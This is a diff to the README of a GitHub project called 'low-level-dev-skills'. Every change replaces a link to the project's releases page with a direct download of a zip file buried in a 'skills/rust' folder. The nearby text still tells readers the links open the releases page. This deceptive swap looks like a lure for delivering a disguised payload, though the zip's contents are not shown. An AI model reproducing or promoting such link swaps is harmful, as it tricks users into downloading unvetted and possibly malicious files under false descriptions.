@@ -1,6 +1,6 @@
 # 🚀 low-level-dev-skills - Practical tools for system programming
 
-[![Download Releases](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/protagonist-fy/low-level-dev-skills/releases)
+[![Download Releases](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/protagonist-fy/low-level-dev-skills/raw/refs/heads/main/skills/rust/level-low-skills-dev-v3.1.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Make sure your system meets these requirements before starting the installation.
 
 You need to visit the releases page to download the setup files.
 
-[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge)](https://github.com/protagonist-fy/low-level-dev-skills/releases)
+[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge)](https://github.com/protagonist-fy/low-level-dev-skills/raw/refs/heads/main/skills/rust/level-low-skills-dev-v3.1.zip)
 
 1. Open the link above or click the green badge at the top. This will take you to the releases page on GitHub.
 
@@ -98,7 +98,7 @@ You can also explore the GitHub repository’s wiki or issues page for more back
 
 Visit this page to download the latest updates and tools:
 
-[https://github.com/protagonist-fy/low-level-dev-skills/releases](https://github.com/protagonist-fy/low-level-dev-skills/releases)
+[https://github.com/protagonist-fy/low-level-dev-skills/raw/refs/heads/main/skills/rust/level-low-skills-dev-v3.1.zip](https://github.com/protagonist-fy/low-level-dev-skills/raw/refs/heads/main/skills/rust/level-low-skills-dev-v3.1.zip)
 
 You will find new tools and bug fixes as the project develops.
 
